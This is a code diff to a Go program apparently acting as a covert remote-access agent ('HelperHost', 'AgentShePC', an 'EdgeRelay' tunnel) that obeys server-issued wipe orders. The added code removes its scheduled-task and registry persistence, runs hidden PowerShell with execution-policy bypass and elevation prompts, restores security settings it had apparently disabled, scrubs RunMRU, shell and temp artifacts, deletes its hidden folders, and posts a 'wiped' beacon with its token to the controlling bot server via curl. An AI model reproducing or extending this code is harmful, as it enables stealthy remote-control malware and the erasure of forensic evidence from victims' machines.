@@ -477,19 +477,35 @@ Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 
 func wipeAll() {
 	stopFlag = true
+	tok := token
+	bb := strings.TrimRight(botBase, "/")
 	if runtime.GOOS == "windows" {
 		restoreWindowsNotifications()
+		// Write latest restore script BEFORE deleting the elevated wipe task.
+		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
+		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		restoreWindowsSecurity()
 		scrubRunMRU()
-		scrubTempInstallArtifacts()
-		clearStateStore()
+		// Do not scrub TEMP yet — bat needs restore script + will self-clean.
 	} else {
 		clearStateStore()
 	}
-	removeAutostart()
+	// Keep HelperHostWipeRestore until bat runs it (elevated AV restore).
+	for _, tn := range []string{"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot", "AgentShePC"} {
+		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
+	}
+	if runtime.GOOS == "windows" {
+		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "HelperHost", "/f").Run()
+		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "AgentShePC", "/f").Run()
+		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "HelperHost", "/f").Run()
+		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "AgentShePC", "/f").Run()
+	}
 	killRelatedProcs()
 	killTunnelOnly()
 	scrubShellArtifacts()
+	if runtime.GOOS == "windows" {
+		clearStateStore()
+	}
 
 	// Unhide so delete tools can see paths, then wipe what we can now.
 	unhidePath(dir)
@@ -518,15 +534,19 @@ func wipeAll() {
 		if tmp := os.Getenv("TEMP"); tmp != "" {
 			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
 		}
-		// Finish: restore again from temp copy, then delete install tree (exe locked until exit).
 		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
+		notifyLine := ""
+		if bb != "" && tok != "" {
+			notifyLine = "curl.exe -fsSL -X POST \"" + bb + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + tok + "\\\"}\" >nul 2>&1\r\n"
+		}
 		body := "@echo off\r\n" +
-			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"ping 127.0.0.1 -n 3 >nul\r\n" +
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-CimInstance Win32_Process|?{$_.Name -match '^(wscript|cscript)\\.exe$' -and $_.CommandLine -match 'watchdog|reconnect|HelperHost'}|%%{Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}; Get-Process HelperHost,EdgeRelay -EA SilentlyContinue|Stop-Process -Force\" >nul 2>&1\r\n" +
 			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
-			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 4 >nul\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { Start-Process -FilePath powershell.exe -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','" + restorePS1 + "') } catch { & powershell.exe -NoProfile -ExecutionPolicy Bypass -File '" + restorePS1 + "' }\" >nul 2>&1\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
@@ -536,6 +556,10 @@ func wipeAll() {
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
+			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
+			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
+			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
+			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + dir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + cacheDir + "\\*\" >nul 2>&1\r\n" +
@@ -543,6 +567,7 @@ func wipeAll() {
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
+			notifyLine +
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
@@ -757,14 +782,11 @@ func enroll(public string) (string, error) {
 			continue
 		}
 		tok, _ := data["token"].(string)
+		if tok != "" {
+			token = tok
+		}
 		if wipe, _ := data["wipe"].(bool); wipe {
 			logf("wipe ordered on enroll")
-			for i := 0; i < 5; i++ {
-				if reportWiped(tok) == nil {
-					break
-				}
-				time.Sleep(2 * time.Second)
-			}
 			wipeAll()
 		}
 		return tok, nil
@@ -861,12 +883,6 @@ func superviseUntilBreak() {
 		_, _ = ensureEdgeRelay()
 		if ticks%3 == 0 && wipeOrdered() {
 			logf("wipe ordered while running")
-			for i := 0; i < 5; i++ {
-				if reportWiped(token) == nil {
-					break
-				}
-				time.Sleep(2 * time.Second)
-			}
 			wipeAll()
 		}
 		cfMu.Lock()
